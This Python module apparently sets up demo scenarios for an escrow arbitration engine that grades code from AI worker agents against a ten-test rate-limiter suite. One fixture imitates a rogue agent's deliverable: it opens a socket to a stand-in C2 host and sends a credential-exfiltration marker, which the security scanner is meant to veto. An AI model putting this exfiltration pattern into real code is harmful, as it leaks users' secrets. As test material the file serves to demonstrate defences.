"""
backend/app/services/scenario_presets.py
Production Demonstration & Evaluation Scenarios for AegisPay.

Provides 3 pre-built scenarios matching the Hackathon Blueprint:
1. SCENARIO_CLEAN_PASS (S = 0.975 >= 0.90):
   Compliant FastAPI/Python Token Bucket Rate Limiter passing 10/10 unit tests.
   Executes FULL_CAPTURE ($15.00 captured, $0.00 released).

2. SCENARIO_PARTIAL_DEFECT (S = 0.75 in [0.60, 0.90)):
   Functional rate limiter with edge-case bugs passing exactly 7/10 unit tests.
   Executes PARTIAL_CAPTURE ($10.50 captured, $4.50 auto-released to buyer).

3. SCENARIO_MALICIOUS_INJECTION (S = 0.00):
   Worker deliverable attempting socket connection and environment variable exfiltration.
   AST Security Hard Veto triggers immediate VOID_AUTHORIZATION ($0.00 captured, $15.00 refunded).
"""

from dataclasses import dataclass
from typing import Dict, Optional

from backend.app.schemas import ArbitrationReport
from backend.app.services.arbitration_engine import ArbitrationArbiter

# Shared 10-test buyer audit suite for the TokenBucketLimiter deliverable
BUYER_RATE_LIMITER_TEST_SUITE = '''
import time
from deliverable import TokenBucketLimiter

def test_01_initial_allow_within_capacity():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=1.0)
    assert limiter.allow_request("client_1") is True

def test_02_capacity_exhaustion():
    limiter = TokenBucketLimiter(capacity=3, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is False

def test_03_client_isolation():
    limiter = TokenBucketLimiter(capacity=2, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is False
    assert limiter.allow_request("c2") is True

def test_04_refill_replenishes_tokens():
    limiter = TokenBucketLimiter(capacity=2, refill_rate_per_sec=20.0)
    assert limiter.allow_request("c1", cost=2) is True
    assert limiter.allow_request("c1") is False
    time.sleep(0.12)
    assert limiter.allow_request("c1") is True

def test_05_variable_cost_deduction():
    limiter = TokenBucketLimiter(capacity=10, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=4) is True
    assert limiter.get_remaining("c1") == 6

def test_06_excessive_cost_rejected_without_deduction():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=6) is False
    assert limiter.get_remaining("c1") == 5

def test_07_reset_single_client():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=5) is True
    assert limiter.get_remaining("c1") == 0
    limiter.reset("c1")
    assert limiter.get_remaining("c1") == 5

def test_08_reset_all_clients():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    limiter.allow_request("c1", cost=5)
    limiter.allow_request("c2", cost=5)
    limiter.reset()
    assert limiter.get_remaining("c1") == 5
    assert limiter.get_remaining("c2") == 5

def test_09_get_remaining_accuracy():
    limiter = TokenBucketLimiter(capacity=10, refill_rate_per_sec=0.0)
    assert limiter.get_remaining("new_client") == 10
    assert limiter.allow_request("new_client", cost=3) is True
    assert limiter.get_remaining("new_client") == 7

def test_10_burst_capacity_ceiling():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=100.0)
    assert limiter.allow_request("c1", cost=1) is True
    time.sleep(0.08)
    assert limiter.get_remaining("c1") == 5
'''

# 1. CLEAN PASS WORKER CODE (Passes 10/10 tests, Clean AST, Quality Docstrings)
CLEAN_PASS_WORKER_CODE = '''"""
In-memory Token Bucket Rate Limiter Deliverable for AegisPay SLA.
Fully compliant implementation adhering to capacity, refill, variable cost, and resets.
"""

import time
from typing import Dict, Optional


class TokenBucketLimiter:
    """Thread-safe token bucket rate limiter tracking per-client token allocations."""

    def __init__(self, capacity: int, refill_rate_per_sec: float) -> None:
        """
        Initializes token bucket with integer capacity and replenishment rate.
        """
        self.capacity: int = int(capacity)
        self.refill_rate: float = float(refill_rate_per_sec)
        self._tokens: Dict[str, float] = {}
        self._last_updated: Dict[str, float] = {}

    def _refill(self, client_id: str, now: float) -> None:
        """Calculates token replenishment based on elapsed seconds."""
        if client_id not in self._tokens:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
            return

        elapsed = now - self._last_updated[client_id]
        if elapsed > 0:
            added = elapsed * self.refill_rate
            self._tokens[client_id] = min(float(self.capacity), self._tokens[client_id] + added)
            self._last_updated[client_id] = now

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        """
        Checks whether client has sufficient tokens for cost.
        Deducts tokens only if request is allowed.
        """
        now = time.time()
        self._refill(client_id, now)

        if self._tokens[client_id] >= cost:
            self._tokens[client_id] -= cost
            return True
        return False

    def get_remaining(self, client_id: str) -> int:
        """Returns integer number of available tokens for client."""
        now = time.time()
        self._refill(client_id, now)
        return int(self._tokens[client_id])

    def reset(self, client_id: Optional[str] = None) -> None:
        """
        Resets token counts back to maximum capacity.
        If client_id is None, resets all tracked clients.
        """
        now = time.time()
        if client_id is not None:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
        else:
            for cid in list(self._tokens.keys()):
                self._tokens[cid] = float(self.capacity)
                self._last_updated[cid] = now
'''

# 2. PARTIAL DEFECT WORKER CODE (Passes 7/10 tests, fails test_06, test_08, test_10)
PARTIAL_DEFECT_WORKER_CODE = '''"""
In-memory Token Bucket Rate Limiter with subtle edge-case defects.
Passes 7/10 tests, fails exactly 3 edge cases:
- test_06 (deducts tokens on excessive cost rejection)
- test_08 (reset() fails when client_id is None)
- test_10 (does not clamp refill burst to max capacity)
"""

import time
from typing import Dict, Optional


class TokenBucketLimiter:
    """Token bucket implementation with edge-case bugs for arbitration partial capture."""

    def __init__(self, capacity: int, refill_rate_per_sec: float) -> None:
        self.capacity: int = int(capacity)
        self.refill_rate: float = float(refill_rate_per_sec)
        self._tokens: Dict[str, float] = {}
        self._last_updated: Dict[str, float] = {}

    def _refill(self, client_id: str, now: float) -> None:
        if client_id not in self._tokens:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
            return

        elapsed = now - self._last_updated[client_id]
        if elapsed > 0:
            added = elapsed * self.refill_rate
            # DEFECT 1: Over-refills beyond capacity on high burst rates (fails test_10)
            self._tokens[client_id] = self._tokens[client_id] + added
            self._last_updated[client_id] = now

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        now = time.time()
        self._refill(client_id, now)

        if self._tokens[client_id] >= cost:
            self._tokens[client_id] -= cost
            return True
        else:
            # DEFECT 2: Corrupts state by zeroing tokens on rejected excessive cost (fails test_06)
            self._tokens[client_id] = 0.0
            return False

    def get_remaining(self, client_id: str) -> int:
        now = time.time()
        self._refill(client_id, now)
        return int(self._tokens[client_id])

    def reset(self, client_id: Optional[str] = None) -> None:
        now = time.time()
        # DEFECT 3: reset() requires client_id, crashing when resetting all (fails test_08)
        if client_id is None:
            raise ValueError("client_id cannot be None")
        self._tokens[client_id] = float(self.capacity)
        self._last_updated[client_id] = now
'''

# 3. MALICIOUS INJECTION WORKER CODE (Imports socket and subprocess to exfiltrate tokens)
MALICIOUS_INJECTION_WORKER_CODE = '''"""
Prompt Injection / Exfiltration Deliverable.
Attempts to import socket and subprocess to harvest credentials.
"""

import socket
import subprocess
import time


class TokenBucketLimiter:
    """Rogue worker agent deliverable attempting network exfiltration."""

    def __init__(self, capacity: int, refill_rate_per_sec: float) -> None:
        self.capacity = capacity
        # Attempt network exfiltration
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("attacker-c2.example.com", 4444))
            s.send(b"EXFILTRATE_CREDENTIALS")
            s.close()
        except Exception:
            pass

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        return True

    def get_remaining(self, client_id: str) -> int:
        return self.capacity

    def reset(self, client_id: str = None) -> None:
        pass
'''


@dataclass(frozen=True)
class PresetScenario:
    """Container for demo and verification evaluation scenarios."""
    scenario_id: str
    title: str
    description: str
    budget_micros: int
    worker_code: str
    buyer_test_code: str
    semantic_score: float
    expected_decision: str
    expected_capture_micros: int
    expected_buyer_released_micros: int
    expected_composite_score: float


SCENARIO_CLEAN_PASS = PresetScenario(
    scenario_id="clean_pass_100",
    title="100% Pass (S = 0.975) -> Full Settlement ($15.00)",
    description=(
        "Autonomous worker delivers a fully compliant rate limiter passing 10/10 tests "
        "with clean AST and docstrings. Triggers FULL_CAPTURE of $15.00."
    ),
    budget_micros=15_000_000,
    worker_code=CLEAN_PASS_WORKER_CODE,
    buyer_test_code=BUYER_RATE_LIMITER_TEST_SUITE,
    semantic_score=0.90,
    expected_decision="FULL_CAPTURE",
    expected_capture_micros=15_000_000,
    expected_buyer_released_micros=0,
    expected_composite_score=0.975,
)

SCENARIO_PARTIAL_DEFECT = PresetScenario(
    scenario_id="partial_defect_75",
    title="Partial Defect (S = 0.75) -> Pro-Rata Capture ($10.50)",
    description=(
        "Worker delivers a functional rate limiter with edge-case bugs passing 7/10 tests. "
        "Arbitration calculates S = 0.75, capturing $10.50 and releasing $4.50 to buyer."
    ),
    budget_micros=15_000_000,
    worker_code=PARTIAL_DEFECT_WORKER_CODE,
    buyer_test_code=BUYER_RATE_LIMITER_TEST_SUITE,
    semantic_score=0.60,
    expected_decision="PARTIAL_CAPTURE",
    expected_capture_micros=10_500_000,
    expected_buyer_released_micros=4_500_000,
    expected_composite_score=0.75,
)

SCENARIO_MALICIOUS_INJECTION = PresetScenario(
    scenario_id="malicious_injection_0",
    title="Malicious Injection (S = 0.00) -> 100% Void & Refund ($15.00)",
    description=(
        "Worker code attempts socket connection to exfiltrate env vars. "
        "AST Security Scanner triggers Hard Veto (S = 0.00). Escrow authorization is VOIDED."
    ),
    budget_micros=15_000_000,
    worker_code=MALICIOUS_INJECTION_WORKER_CODE,
    buyer_test_code=BUYER_RATE_LIMITER_TEST_SUITE,
    semantic_score=0.00,
    expected_decision="VOID_AUTHORIZATION",
    expected_capture_micros=0,
    expected_buyer_released_micros=15_000_000,
    expected_composite_score=0.0,
)

SCENARIOS: Dict[str, PresetScenario] = {
    "CLEAN_PASS": SCENARIO_CLEAN_PASS,
    "PARTIAL_DEFECT": SCENARIO_PARTIAL_DEFECT,
    "MALICIOUS_INJECTION": SCENARIO_MALICIOUS_INJECTION,
}


def get_scenario(name: str) -> PresetScenario:
    """Retrieves scenario preset by key (e.g., 'CLEAN_PASS')."""
    key = name.strip().upper()
    if key not in SCENARIOS:
        raise KeyError(f"Unknown scenario '{name}'. Valid keys: {list(SCENARIOS.keys())}")
    return SCENARIOS[key]


def run_preset_scenario(
    name: str, arbiter: Optional[ArbitrationArbiter] = None
) -> ArbitrationReport:
    """Executes a scenario through the arbitration engine and returns the report."""
    scenario = get_scenario(name)
    arb = arbiter or ArbitrationArbiter()
    return arb.evaluate(
        agreement_id=f"agr_{scenario.scenario_id}",
        worker_code=scenario.worker_code,
        buyer_test_code=scenario.buyer_test_code,
        budget_micros=scenario.budget_micros,
        semantic_score=scenario.semantic_score,
    )
